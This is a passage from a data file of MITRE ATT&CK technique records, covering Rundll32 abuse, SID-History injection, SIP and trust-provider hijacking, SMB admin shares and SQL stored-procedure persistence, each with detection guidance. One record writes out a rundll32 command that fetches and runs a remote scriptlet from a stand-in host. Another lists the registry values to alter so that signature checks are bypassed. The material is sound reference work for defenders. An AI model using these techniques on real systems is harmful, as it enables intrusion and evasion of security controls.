behavior.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:06.045Z\",\"external_references\":[{\"external_id\":\"T1085\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1085\"},{\"description\":\"Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.\",\"source_name\":\"Trend Micro CPL\",\"url\":\"https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf\"},{\"description\":\"B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018.\",\"source_name\":\"This is Security Command Line Confusion\",\"url\":\"https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/\"}],\"id\":\"attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5\",\"modified\":\"2020-01-31T19:01:41.919Z\",\"name\":\"Rundll32\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-23T18:03:46.248Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads.\\n\\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\\n\\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication \\\";document.write();GetObject(\\\"script:https[:]//www[.]example[.]com/malicious.sct\\\")\\\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\",\"external_references\":[{\"external_id\":\"T1218.011\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1218/011\"},{\"description\":\"Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.\",\"source_name\":\"Trend Micro CPL\",\"url\":\"https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf\"},{\"description\":\"B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018.\",\"source_name\":\"This is Security Command Line Confusion\",\"url\":\"https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/\"}],\"id\":\"attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:31:42.113Z\",\"name\":\"Rundll32\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Casey Smith\",\"Ricardo Dias\"],\"x_mitre_data_sources\":[\"DLL monitoring\",\"Loaded DLLs\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Digital Certificate Validation\",\"Application control\",\"Anti-virus\"],\"x_mitre_detection\":\"Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-04-09T16:09:22.173Z\",\"external_references\":[{\"external_id\":\"T1494\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1494\"},{\"description\":\"FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved November 6, 2018.\",\"source_name\":\"FireEye APT38 Oct 2018\",\"url\":\"https://content.fireeye.com/apt/rpt-apt38\"},{\"description\":\"Department of Justice. (2018, September 6). Criminal Complaint - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.\",\"source_name\":\"DOJ Lazarus Sony 2018\",\"url\":\"https://www.justice.gov/opa/press-release/file/1092091/download\"}],\"id\":\"attack-pattern--ca205a36-c1ad-488b-aa6c-ab34bdd3a36b\",\"modified\":\"2020-03-02T14:30:49.400Z\",\"name\":\"Runtime Data Manipulation\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-02T14:30:05.252Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\\n\\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.\",\"external_references\":[{\"external_id\":\"T1565.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1565/003\"},{\"description\":\"FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved November 6, 2018.\",\"source_name\":\"FireEye APT38 Oct 2018\",\"url\":\"https://content.fireeye.com/apt/rpt-apt38\"},{\"description\":\"Department of Justice. (2018, September 6). Criminal Complaint - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.\",\"source_name\":\"DOJ Lazarus Sony 2018\",\"url\":\"https://www.justice.gov/opa/press-release/file/1092091/download\"}],\"id\":\"attack-pattern--32ad5c86-2bcf-47d8-8fdc-d7f3d79a7490\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-28T23:10:34.359Z\",\"name\":\"Runtime Data Manipulation\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Inspect important application binary file hashes, locations, and modifications for suspicious/unexpected values.\",\"x_mitre_impact_type\":[\"Integrity\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"root\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-01-16T16:13:52.465Z\",\"external_references\":[{\"external_id\":\"T1178\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1178\"},{\"description\":\"Microsoft. (n.d.). Security Identifiers. Retrieved November 30, 2017.\",\"source_name\":\"Microsoft SID\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/aa379571.aspx\"},{\"description\":\"Microsoft. (n.d.). Active Directory Schema - SID-History attribute. Retrieved November 30, 2017.\",\"source_name\":\"Microsoft SID-History Attribute\",\"url\":\"https://msdn.microsoft.com/library/ms679833.aspx\"},{\"description\":\"Microsoft. (2017, June 23). Well-known security identifiers in Windows operating systems. Retrieved November 30, 2017.\",\"source_name\":\"Microsoft Well Known SIDs Jun 2017\",\"url\":\"https://support.microsoft.com/help/243330/well-known-security-identifiers-in-windows-operating-systems\"},{\"description\":\"Microsoft. (n.d.). Active Directory Cmdlets - Get-ADUser. Retrieved November 30, 2017.\",\"source_name\":\"Microsoft Get-ADUser\",\"url\":\"https://technet.microsoft.com/library/ee617241.aspx\"},{\"description\":\"Metcalf, S. (2015, September 19). Sneaky Active Directory Persistence #14: SID History. Retrieved November 30, 2017.\",\"source_name\":\"AdSecurity SID History Sept 2015\",\"url\":\"https://adsecurity.org/?p=1772\"},{\"description\":\"Microsoft. (n.d.). Using DsAddSidHistory. Retrieved November 30, 2017.\",\"source_name\":\"Microsoft DsAddSidHistory\",\"url\":\"https://msdn.microsoft.com/library/ms677982.aspx\"}],\"id\":\"attack-pattern--1df0326d-2fbc-4d08-a16b-48365f1e742d\",\"modified\":\"2020-02-18T18:35:21.493Z\",\"name\":\"SID-History Injection\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-18T18:34:49.414Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\\n\\nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077), or [Windows Remote Management](https://attack.mitre.org/techniques/T1028).\",\"external_references\":[{\"external_id\":\"T1134.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1134/005\"},{\"description\":\"Microsoft. (n.d.). Security Identifiers. Retrieved November 30, 2017.\",\"source_name\":\"Microsoft SID\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/aa379571.aspx\"},{\"description\":\"Microsoft. (n.d.). Active Directory Schema - SID-History attribute. Retrieved November 30, 2017.\",\"source_name\":\"Microsoft SID-History Attribute\",\"url\":\"https://msdn.microsoft.com/library/ms679833.aspx\"},{\"description\":\"Microsoft. (2017, June 23). Well-known security identifiers in Windows operating systems. Retrieved November 30, 2017.\",\"source_name\":\"Microsoft Well Known SIDs Jun 2017\",\"url\":\"https://support.microsoft.com/help/243330/well-known-security-identifiers-in-windows-operating-systems\"},{\"description\":\"Microsoft. (n.d.). Active Directory Cmdlets - Get-ADUser. Retrieved November 30, 2017.\",\"source_name\":\"Microsoft Get-ADUser\",\"url\":\"https://technet.microsoft.com/library/ee617241.aspx\"},{\"description\":\"Metcalf, S. (2015, September 19). Sneaky Active Directory Persistence #14: SID History. Retrieved November 30, 2017.\",\"source_name\":\"AdSecurity SID History Sept 2015\",\"url\":\"https://adsecurity.org/?p=1772\"},{\"description\":\"Microsoft. (n.d.). Using DsAddSidHistory. Retrieved November 30, 2017.\",\"source_name\":\"Microsoft DsAddSidHistory\",\"url\":\"https://msdn.microsoft.com/library/ms677982.aspx\"}],\"id\":\"attack-pattern--b7dc639b-24cd-482d-a7f1-8897eda21023\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-26T21:49:31.964Z\",\"name\":\"SID-History Injection\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Alain Homewood, Insomnia Security\",\"Vincent Le Toux\"],\"x_mitre_data_sources\":[\"Windows event logs\",\"Authentication logs\",\"API monitoring\"],\"x_mitre_detection\":\"Examine data in user’s SID-History attributes using the PowerShell <code>Get-ADUser</code> cmdlet (Citation: Microsoft Get-ADUser), especially users who have SID-History values from the same domain. (Citation: AdSecurity SID History Sept 2015) Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. (Citation: AdSecurity SID History Sept 2015) (Citation: Microsoft DsAddSidHistory)\\n\\nMonitor for Windows API calls to the <code>DsAddSidHistory</code> function. (Citation: Microsoft DsAddSidHistory)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"external_references\":[{\"external_id\":\"T1198\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1198\"},{\"description\":\"Microsoft. (n.d.). Authenticode. Retrieved January 31, 2018.\",\"source_name\":\"Microsoft Authenticode\",\"url\":\"https://msdn.microsoft.com/library/ms537359.aspx\"},{\"description\":\"Microsoft. (n.d.). WinVerifyTrust function. Retrieved January 31, 2018.\",\"source_name\":\"Microsoft WinVerifyTrust\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/aa388208.aspx\"},{\"description\":\"Graeber, M. (2017, September). Subverting Trust in Windows. Retrieved January 31, 2018.\",\"source_name\":\"SpectorOps Subverting Trust Sept 2017\",\"url\":\"https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf\"},{\"description\":\"Navarro, E. (2008, July 11). SIP’s (Subject Interface Package) and Authenticode. Retrieved January 31, 2018.\",\"source_name\":\"EduardosBlog SIPs July 2008\",\"url\":\"https://blogs.technet.microsoft.com/eduardonavarro/2008/07/11/sips-subject-interface-package-and-authenticode/\"},{\"description\":\"Hudek, T. (2017, April 20). Catalog Files and Digital Signatures. Retrieved January 31, 2018.\",\"source_name\":\"Microsoft Catalog Files and Signatures April 2017\",\"url\":\"https://docs.microsoft.com/windows-hardware/drivers/install/catalog-files\"},{\"description\":\"Graeber, M. (2017, September 14). PoCSubjectInterfacePackage. Retrieved January 31, 2018.\",\"source_name\":\"GitHub SIP POC Sept 2017\",\"url\":\"https://github.com/mattifestation/PoCSubjectInterfacePackage\"},{\"description\":\"Entrust Datacard. (2017, August 16). How do I enable CAPI 2.0 logging in Windows Vista, Windows 7 and Windows 2008 Server?. Retrieved January 31, 2018.\",\"source_name\":\"Entrust Enable CAPI2 Aug 2017\",\"url\":\"http://www.entrust.net/knowledge-base/technote.cfm?tn=8165\"},{\"description\":\"Microsoft. (2016, August 31). Registry (Global Object Access Auditing). Retrieved January 31, 2018.\",\"source_name\":\"Microsoft Registry Auditing Aug 2016\",\"url\":\"https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn311461(v=ws.11)\"},{\"description\":\"Microsoft. (2012, July 2). Audit Registry. Retrieved January 31, 2018.\",\"source_name\":\"Microsoft Audit Registry July 2012\",\"url\":\"https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd941614(v=ws.10)\"}],\"id\":\"attack-pattern--72b5ef57-325c-411b-93ca-a3ca6fa17e31\",\"modified\":\"2020-02-05T19:35:58.954Z\",\"name\":\"SIP and Trust Provider Hijacking\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-05T19:34:04.910Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file\'s origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)\\n\\nBecause of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)\\n\\nSimilar to [Code Signing](https://attack.mitre.org/techniques/T1116), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)\\n\\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\\\SOFTWARE[\\\\WOW6432Node\\\\]Microsoft\\\\Cryptography\\\\OID\\\\EncodingType 0\\\\CryptSIPDllGetSignedDataMsg\\\\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).\\n* Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\\\\SOFTWARE\\\\[WOW6432Node\\\\]Microsoft\\\\Cryptography\\\\OID\\\\EncodingType 0\\\\CryptSIPDllVerifyIndirectData\\\\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.\\n* Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\\\\SOFTWARE\\\\[WOW6432Node\\\\]Microsoft\\\\Cryptography\\\\Providers\\\\Trust\\\\FinalPolicy\\\\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).\\n* **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).\\n\\nHijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)\",\"external_references\":[{\"external_id\":\"T1553.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1553/003\"},{\"description\":\"Microsoft. (n.d.). Authenticode. Retrieved January 31, 2018.\",\"source_name\":\"Microsoft Authenticode\",\"url\":\"https://msdn.microsoft.com/library/ms537359.aspx\"},{\"description\":\"Microsoft. (n.d.). WinVerifyTrust function. Retrieved January 31, 2018.\",\"source_name\":\"Microsoft WinVerifyTrust\",\"url\":\"https://msdn.microsoft.com/library/windows/desktop/aa388208.aspx\"},{\"description\":\"Graeber, M. (2017, September). Subverting Trust in Windows. Retrieved January 31, 2018.\",\"source_name\":\"SpectorOps Subverting Trust Sept 2017\",\"url\":\"https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf\"},{\"description\":\"Navarro, E. (2008, July 11). SIP’s (Subject Interface Package) and Authenticode. Retrieved January 31, 2018.\",\"source_name\":\"EduardosBlog SIPs July 2008\",\"url\":\"https://blogs.technet.microsoft.com/eduardonavarro/2008/07/11/sips-subject-interface-package-and-authenticode/\"},{\"description\":\"Hudek, T. (2017, April 20). Catalog Files and Digital Signatures. Retrieved January 31, 2018.\",\"source_name\":\"Microsoft Catalog Files and Signatures April 2017\",\"url\":\"https://docs.microsoft.com/windows-hardware/drivers/install/catalog-files\"},{\"description\":\"Graeber, M. (2017, September 14). PoCSubjectInterfacePackage. Retrieved January 31, 2018.\",\"source_name\":\"GitHub SIP POC Sept 2017\",\"url\":\"https://github.com/mattifestation/PoCSubjectInterfacePackage\"},{\"description\":\"Entrust Datacard. (2017, August 16). How do I enable CAPI 2.0 logging in Windows Vista, Windows 7 and Windows 2008 Server?. Retrieved January 31, 2018.\",\"source_name\":\"Entrust Enable CAPI2 Aug 2017\",\"url\":\"http://www.entrust.net/knowledge-base/technote.cfm?tn=8165\"},{\"description\":\"Microsoft. (2016, August 31). Registry (Global Object Access Auditing). Retrieved January 31, 2018.\",\"source_name\":\"Microsoft Registry Auditing Aug 2016\",\"url\":\"https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn311461(v=ws.11)\"},{\"description\":\"Microsoft. (2012, July 2). Audit Registry. Retrieved January 31, 2018.\",\"source_name\":\"Microsoft Audit Registry July 2012\",\"url\":\"https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd941614(v=ws.10)\"}],\"id\":\"attack-pattern--543fceb5-cb92-40cb-aacf-6913d4db58bc\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:42:26.022Z\",\"name\":\"SIP and Trust Provider Hijacking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Matt Graeber, @mattifestation, SpecterOps\"],\"x_mitre_data_sources\":[\"Windows Registry\",\"API monitoring\",\"Application logs\",\"DLL monitoring\",\"Loaded DLLs\",\"Process monitoring\",\"Windows Registry\",\"Windows event logs\"],\"x_mitre_defense_bypassed\":[\"Application control\",\"Autoruns Analysis\",\"Digital Certificate Validation\",\"User Mode Signature Validation\"],\"x_mitre_detection\":\"Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries. (Citation: SpectorOps Subverting Trust Sept 2017)\\n\\nEnable CryptoAPI v2 (CAPI) event logging (Citation: Entrust Enable CAPI2 Aug 2017) to monitor and analyze error events related to failed trust validation (Event ID 81, though this event can be subverted by hijacked trust provider components) as well as any other provided information events (ex: successful validations). Code Integrity event logging may also provide valuable indicators of malicious SIP or trust provider loads, since protected processes that attempt to load a maliciously-crafted trust validation component will likely fail (Event ID 3033). (Citation: SpectorOps Subverting Trust Sept 2017)\\n\\nUtilize Sysmon detection rules and/or enable the Registry (Global Object Access Auditing) (Citation: Microsoft Registry Auditing Aug 2016) setting in the Advanced Security Audit policy to apply a global system access control list (SACL) and event auditing on modifications to Registry values (sub)keys related to SIPs and trust providers: (Citation: Microsoft Audit Registry July 2012)\\n\\n* HKLM\\\\SOFTWARE\\\\Microsoft\\\\Cryptography\\\\OID\\n* HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Cryptography\\\\OID\\n* HKLM\\\\SOFTWARE\\\\Microsoft\\\\Cryptography\\\\Providers\\\\Trust\\n* HKLM\\\\SOFTWARE\\\\WOW6432Node\\\\Microsoft\\\\Cryptography\\\\Providers\\\\Trust\\n\\n**Note:** As part of this technique, adversaries may attempt to manually edit these Registry keys (ex: Regedit) or utilize the legitimate registration process using [Regsvr32](https://attack.mitre.org/techniques/T1117). (Citation: SpectorOps Subverting Trust Sept 2017)\\n\\nAnalyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure “Hide Microsoft Entries” and “Hide Windows Entries” are both deselected. (Citation: SpectorOps Subverting Trust Sept 2017)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"SYSTEM\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T18:25:28.212Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\\n\\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\\n\\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)\",\"external_references\":[{\"external_id\":\"T1021.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1021/002\"},{\"external_id\":\"CAPEC-561\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/561.html\"},{\"description\":\"Wikipedia. (2017, December 16). Server Message Block. Retrieved December 21, 2017.\",\"source_name\":\"Wikipedia Server Message Block\",\"url\":\"https://en.wikipedia.org/wiki/Server_Message_Block\"},{\"description\":\"Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12, 2016.\",\"source_name\":\"TechNet RPC\",\"url\":\"https://technet.microsoft.com/en-us/library/cc787851.aspx\"},{\"description\":\"Microsoft. (n.d.). How to create and delete hidden or administrative shares on client computers. Retrieved November 20, 2014.\",\"source_name\":\"Microsoft Admin Shares\",\"url\":\"http://support.microsoft.com/kb/314984\"},{\"description\":\"Payne, J. (2015, November 26). Tracking Lateral Movement Part One - Special Groups and Specific Service Accounts. Retrieved February 1, 2016.\",\"source_name\":\"Lateral Movement Payne\",\"url\":\"https://docs.microsoft.com/en-us/archive/blogs/jepayne/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts\"},{\"description\":\"Payne, J. (2015, November 23). Monitoring what matters - Windows Event Forwarding for everyone (even if you already have a SIEM.). Retrieved February 1, 2016.\",\"source_name\":\"Windows Event Forwarding Payne\",\"url\":\"https://docs.microsoft.com/en-us/archive/blogs/jepayne/monitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem\"},{\"description\":\"French, D. (2018, October 9). Detecting & Removing an Attacker’s WMI Persistence. Retrieved October 11, 2019.\",\"source_name\":\"Medium Detecting WMI Persistence\",\"url\":\"https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96\"}],\"id\":\"attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"lateral-movement\"}],\"modified\":\"2020-03-23T21:16:02.812Z\",\"name\":\"SMB/Windows Admin Shares\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"Authentication logs\",\"Process use of network\"],\"x_mitre_detection\":\"Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding. (Citation: Lateral Movement Payne)(Citation: Windows Event Forwarding Payne) Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [Net](https://attack.mitre.org/software/S0039), on the command-line interface and Discovery techniques that could be used to find remotely accessible systems.(Citation: Medium Detecting WMI Persistence)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_system_requirements\":[\"SMB enabled; Host/network firewalls not blocking SMB ports between source and destination; Use of domain account in administrator group on remote system or default system admin account.\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-12-12T14:59:58.168Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).\\n\\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017) \\n\\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify 